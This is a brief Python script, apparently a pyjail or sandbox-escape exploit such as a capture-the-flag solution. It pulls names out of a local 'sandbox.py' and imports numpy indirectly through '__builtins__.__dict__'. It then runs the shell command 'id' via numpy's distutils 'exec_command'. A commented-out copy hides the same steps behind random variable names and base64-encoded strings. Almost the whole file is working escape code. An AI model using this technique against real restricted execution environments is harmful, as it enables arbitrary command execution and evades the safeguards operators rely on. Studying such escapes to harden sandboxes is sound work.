sand_file = open("./sandbox.py", "r")
n = int(((54 * 8) / 16) * (1/3) - 8)
#-8
read_content = sand_file.readlines()[n].strip().split(" ")
print("read_content", read_content)
last_8 = read_content[n]
print("last_8",last_8)
first_8 = read_content[-n]
print("first_8",first_8)
sand_file.close()
mod_attr = getattr(__import__(last_8), first_8)
command="RMbPOQHCzt.distutils.exec_command('id')"
final_cmd = """RMbPOQHCzt = __builtins__.__dict__['__import__']('numpy')\n""" + command
exec(final_cmd)

# uOaoBPLLRN = open("sandbox.py", "r")
# uDwjTIgNRU = int(((54 * 8) / 16) * (1/3) - 8)
# ORppRjAVZL = uOaoBPLLRN.readlines()[uDwjTIgNRU].strip().split(" ")
# AAnBLJqtRv = ORppRjAVZL[uDwjTIgNRU]
# bAfGdqzzpg = ORppRjAVZL[-uDwjTIgNRU]
# uOaoBPLLRN.close()
# HrjYMvtxwA = getattr(__import__(AAnBLJqtRv), bAfGdqzzpg)
# RMbPOQHCzt = __builtins__.__dict__[HrjYMvtxwA(b'X19pbXBvcnRfXw==').decode('utf-8')](HrjYMvtxwA(b'bnVtcHk=').decode('utf-8'))